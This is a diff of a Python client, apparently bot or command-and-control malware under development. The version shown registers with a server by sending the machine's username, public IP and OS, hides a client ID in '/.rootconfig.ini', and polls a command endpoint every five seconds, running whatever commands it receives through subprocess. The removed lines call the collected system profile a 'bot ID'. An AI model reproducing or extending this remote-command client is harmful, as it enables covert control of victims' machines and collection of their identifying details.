@@ -2,49 +2,119 @@ import requests
 import subprocess
 import time
 import platform
-import uuid
-import socket
 import os
+import json
 
-SERVER_URL = "http://127.0.0.1:5000"  # Updated to use port 5000
+SERVER_URL = "http://127.0.0.1:5000"  # Change to your actual server URL later
 
-def detect_os():
-    """Detect the operating system and return 'Windows' or 'Linux'."""
-    os_name = platform.system()
-    if os_name == "Windows":
-        return "Windows"
-    elif os_name == "Linux":
-        return "Linux"
+CONFIG_FILE_LINUX = "/.rootconfig.ini"  # Path in Linux root directory
+CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
+
+# Function to get the username using `whoami` (works on both Windows and Linux)
+def get_username():
+    try:
+        username = subprocess.check_output("whoami", shell=True).decode().strip()
+        return username
+    except Exception as e:
+        print(f"Error retrieving username: {e}")
+        return None
+
+# Function to get the public IP address
+def get_public_ip():
+    try:
+        # Use an external API to get the public IP address
+        response = requests.get("https://api.ipify.org?format=json")
+        if response.status_code == 200:
+            public_ip = response.json().get("ip")
+            return public_ip
+        else:
+            print("Failed to get public IP")
+            return None
+    except Exception as e:
+        print(f"Error retrieving public IP: {e}")
+        return None
+
+# Function to check if the server URL is active
+def is_server_url_active(url):
+    try:
+        response = requests.get(url, timeout=5)
+        if response.status_code == 200:
+            print("Server is active and reachable.")
+            return True
+        else:
+            print(f"Server responded with status code: {response.status_code}")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"Error connecting to server: {e}")
+        return False
+
+# Function to check if the configuration file exists based on the OS
+def check_config_file():
+    if platform.system() == "Linux":
+        return os.path.exists(CONFIG_FILE_LINUX)
+    elif platform.system() == "Windows":
+        return os.path.exists(CONFIG_FILE_WINDOWS)
     else:
-        return "Unknown"
+        return False
 
-# Assign detected OS to a variable
-OS = detect_os()
+# Check and register the client if necessary
+def check_and_register_client():
+    # Check if the server is active (reachable)
+    while not is_server_url_active(SERVER_URL):
+        print(f"Server at {SERVER_URL} is not active. Retrying in 1 minute...")
+        time.sleep(2)  # Wait for 1 minute before retrying
 
-def get_system_info():
-    """Collect system information based on the detected OS."""
-    system_info = {
-        "id": str(uuid.uuid4()),  # Unique bot ID
-        "hostname": socket.gethostname(),
-        "os": OS,
-        "arch": platform.machine(),
+    print(f"Server at {SERVER_URL} is now active. Proceeding with registration...")
+
+    # Check if the config file exists based on OS
+    if check_config_file():
+        config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
+        with open(config_file, 'r') as file:
+            data = json.load(file)
+            return data.get("client_id")
+    else:
+        # File is missing or empty, so register with the server
+        return register_client()
+
+# Register the client and get a client_id from the server
+def register_client():
+    # Get client details (user, public IP, OS)
+    user = get_username()  # Get the username using whoami
+    public_ip = get_public_ip()
+    os_name = os.uname().sysname if platform.system() != "Windows" else platform.system()
+
+    if not user or not public_ip:
+        print("Error: Could not retrieve necessary information.")
+        return None
+
+    # Send registration request to the server
+    registration_data = {
+        'user': user,
+        'public_ip': public_ip,
+        'os': os_name
     }
 
-    if OS == "Windows":
-        system_info.update({
-            "kernel": platform.version(),
-            "user": os.getlogin(),
-            "privilege": "Admin" if os.name == "nt" and os.getuid() == 0 else "User"
-        })
-    elif OS == "Linux":
-        system_info.update({
-            "kernel": platform.version(),
-            "user": os.getlogin(),
-            "privilege": "Root" if os.geteuid() == 0 else "User"
-        })
-    
-    return system_info
+    try:
+        # Send a POST request to the /clientRegistration endpoint
+        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data)
 
+        if response.status_code == 200:
+            # Server response contains the client_id
+            client_data = response.json()
+            client_id = client_data.get("client_id")
+
+            # Save client_id to the config file based on OS
+            config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
+            with open(config_file, 'w') as file:
+                json.dump({"client_id": client_id}, file)
+
+            return client_id
+        else:
+            print(f"Registration failed. Status Code: {response.status_code}")
+            return None
+    except Exception as e:
+        print(f"Error during registration: {e}")
+        return None
 
 # Track the current working directory (starting with the root or default directory)
 current_directory = "/"
@@ -75,10 +145,18 @@ def execute_command(command):
     except subprocess.CalledProcessError as e:
         return f"Error: {e.output}"
 
+# Start the check-and-register process
+client_id = check_and_register_client()
+
+if client_id:
+    print(f"Client registered with ID: {client_id}")
+else:
+    print("Client registration failed.")
+
 while True:
     try:
         # Fetch command from the server every 5 seconds
-        response = requests.get(f"{SERVER_URL}/command-transmission-to-client", timeout=5)  # Set timeout for the request
+        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5)  # Set timeout for the request
         
         # Check if the response status is OK
         if response.status_code == 200:
